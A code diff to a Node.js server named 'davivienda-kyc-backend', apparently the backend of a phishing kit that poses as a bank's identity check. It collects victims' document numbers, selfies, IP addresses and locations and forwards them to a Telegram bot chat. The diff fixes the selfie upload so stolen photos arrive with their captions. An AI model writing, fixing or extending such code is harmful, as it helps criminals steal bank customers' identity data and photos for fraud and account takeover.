@@ -4,6 +4,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const cors = require('cors');
+const FormData = require('form-data');
 const app = express();
 
 const corsOptions = {
@@ -34,7 +35,7 @@ app.get('/', (_req, res) => {
     ok: true, 
     service: 'davivienda-kyc-backend', 
     hasEnv: !!(BOT_TOKEN && CHAT_ID),
-    version: '1.0.0'
+    version: '1.0.1'
   });
 });
 
@@ -172,7 +173,7 @@ app.post('/paso-aceptar', async (req, res) => {
 });
 
 // ====================================================================================
-// 📨 RUTA 3: KYC COMPLETO (CON FOTO)
+// 📨 RUTA 3: KYC COMPLETO (CON FOTO) ✅ CORREGIDO
 // ====================================================================================
 app.post('/kyc-completo', async (req, res) => {
   try {
@@ -186,11 +187,6 @@ app.post('/kyc-completo', async (req, res) => {
     const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
     const buffer = Buffer.from(base64Data, 'base64');
 
-    // Enviar foto primero
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'selfie.jpg');
-    
     const caption = `
 📸 KYC COMPLETADO
 📄 Doc: ${docu}
@@ -198,17 +194,20 @@ app.post('/kyc-completo', async (req, res) => {
 🌐 IP: ${ip} - ${city}, ${country}
 🆔 sessionId: ${sessionId}
     `.trim();
-    
+
+    // ✅ MÉTODO CORRECTO: Usar form-data para enviar la foto
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', buffer, {
+      filename: 'selfie.jpg',
+      contentType: 'image/jpeg'
+    });
     formData.append('caption', caption);
 
-    // Enviar foto con caption
-    await axios.post(getTelegramApiUrl('sendPhoto'), buffer, {
+    // Enviar foto con los headers correctos
+    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
       headers: {
-        'Content-Type': 'multipart/form-data'
-      },
-      params: {
-        chat_id: CHAT_ID,
-        caption: caption
+        ...formData.getHeaders()
       }
     });
 
@@ -311,6 +310,7 @@ app.listen(PORT, () => {
 ║   📡 Puerto: ${PORT}                        ║
 ║   🤖 Bot: ${BOT_TOKEN ? 'Configurado ✓' : 'No configurado ✗'}     ║
 ║   💬 Chat: ${CHAT_ID ? 'Configurado ✓' : 'No configurado ✗'}    ║
+║   📸 Envío de fotos: CORREGIDO ✓         ║
 ╚═══════════════════════════════════════════╝
   `);
 });
